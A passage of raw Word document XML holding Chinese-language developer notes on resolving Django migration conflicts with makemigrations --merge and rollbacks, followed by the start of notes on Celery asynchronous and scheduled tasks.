        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="360" w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="404040"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:color w:val="404040"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>解决方案</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B00F81" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002941E1" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="360" w:after="360" w:line="4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方法</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：使用</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="宋体" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>python manage.py migrations -merge</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="宋体" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>进行合并</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="014FAE72" w14:textId="5471595D" w:rsidR="00B61AC7" w:rsidRPr="00A9357A" w:rsidRDefault="00A9357A" w:rsidP="00A9357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1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>尝试执行</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> python manage.py migrate (</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在这个时候，</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Django </w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>将会查看这些冲突，然后告诉你执行</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> python manage.py makemigrations –merge</w:t>
      </w:r>
      <w:r w:rsidR="0038277E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68E3F213" w14:textId="5DE717DA" w:rsidR="00B61AC7" w:rsidRPr="00A9357A" w:rsidRDefault="0038277E" w:rsidP="00A9357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2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>执行</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> python manage.py makemigrations –merge</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">migrations </w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>将会自动被合并；你将会创建一个新的</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> migration </w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>叫</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0004_merge.py </w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>被放在</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">migrations </w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>文件夹中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BCAB89F" w14:textId="1B7E3242" w:rsidR="00B61AC7" w:rsidRPr="00A9357A" w:rsidRDefault="0038277E" w:rsidP="00A9357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3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>执行</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00A9357A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> python manage.py migrate</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B19520C" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002941E1" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="360" w:after="360"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方法</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>回滚然后再次合并</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="156D8F99" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="0038277E" w:rsidRDefault="00B61AC7" w:rsidP="0038277E">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8277E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>使用</w:t>
      </w:r>
      <w:r w:rsidRPr="0038277E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> python manage.py migrate app_name migration_name </w:t>
      </w:r>
      <w:r w:rsidRPr="0038277E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在你的分支中回滚最近正常的</w:t>
      </w:r>
      <w:r w:rsidRPr="0038277E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> migration</w:t>
      </w:r>
      <w:r w:rsidRPr="0038277E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="272A902A" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00EB10F9" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="360" w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="404040"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:color w:val="404040"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>数据迁移时，只能让表结构统一，数据的话只能另外导出</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:color w:val="404040"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> sql </w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:color w:val="404040"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>文件，让对方进行导入（目录的解决方法）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26E95BD9" w14:textId="0B6A1AC1" w:rsidR="00B61AC7" w:rsidRPr="00CE5D00" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:eastAsia="宋体" w:hAnsi="Segoe UI Emoji" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="404040"/>
          <w:kern w:val="36"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE5D00">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:eastAsia="宋体" w:hAnsi="Segoe UI Emoji" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="404040"/>
          <w:kern w:val="36"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
        <w:t>django migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="00CE5D00">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:eastAsia="宋体" w:hAnsi="Segoe UI Emoji" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="404040"/>
          <w:kern w:val="36"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
        <w:t>冲突</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61755D56" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00CE5D00" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="240" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="404040"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE5D00">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="404040"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>django migrate 冲突解决</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E8A8D59" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00CE5D00" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="300" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE5D00">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>冲突起因， makemigrations 记录sql的变化， migrate执行，多人协作或一不留神，常常造成冲突。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="545D78C1" w14:textId="2C7513A2" w:rsidR="00B61AC7" w:rsidRPr="00945225" w:rsidRDefault="00945225" w:rsidP="00945225">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1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00945225">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>解决</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00945225">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>makemigrations</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00945225">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对应冲突的脚本</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E6B50E8" w14:textId="227EEDB1" w:rsidR="00B61AC7" w:rsidRPr="00945225" w:rsidRDefault="00945225" w:rsidP="00945225">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2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="00945225">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>增量修改表结构</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC91A9E" w14:textId="77777777" w:rsidR="00330CED" w:rsidRDefault="00330CED" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>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Celery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="110F1770" w14:textId="77777777" w:rsidR="00330CED" w:rsidRPr="002A710F" w:rsidRDefault="00330CED" w:rsidP="00330CED">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A710F">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>运用场景：注册的功能，在用户使用邮箱注册成功之后，需要给该邮箱发送一封激活邮件。如果直接放在应用中，则调用发邮件的过程会遇到网络</w:t>
      </w:r>
      <w:r w:rsidRPr="002A710F">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>IO</w:t>
      </w:r>
      <w:r w:rsidRPr="002A710F">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的阻塞，比较好的处理方式则是使用异步任务，将发邮件从主业务中解耦出来，应用在业务逻辑中触发一个异步任务。或者有上传任务，处理上传图片，上传视频等。执行命令的时候也可以异步执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B02D6DE" w14:textId="77777777" w:rsidR="00330CED" w:rsidRPr="002A710F" w:rsidRDefault="00330CED" w:rsidP="00330CED">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A710F">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>定时任务：一般会用在爬虫上，研究网站的更新速度，进行定时爬取。爬取到的内容先放在</w:t>
      </w:r>
      <w:r w:rsidRPr="002A710F">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r w:rsidRPr="002A710F">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中进行去重，然后存储到数据库中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06F9B873" w14:textId="77777777" w:rsidR="00330CED" w:rsidRPr="007C2612" w:rsidRDefault="00330CED" w:rsidP="00330CED">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A710F">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>异步任务：异步任务是</w:t>
      </w:r>
      <w:r w:rsidRPr="002A710F">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r w:rsidRPr="002A710F">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>开发中一个很常见的方法。对于一些耗时耗资源的操作，往往从主应用中隔离，通过异步的方式执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3525D74A"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二、生产者消费者模式</w:t>
      </w:r>
    </w:p>
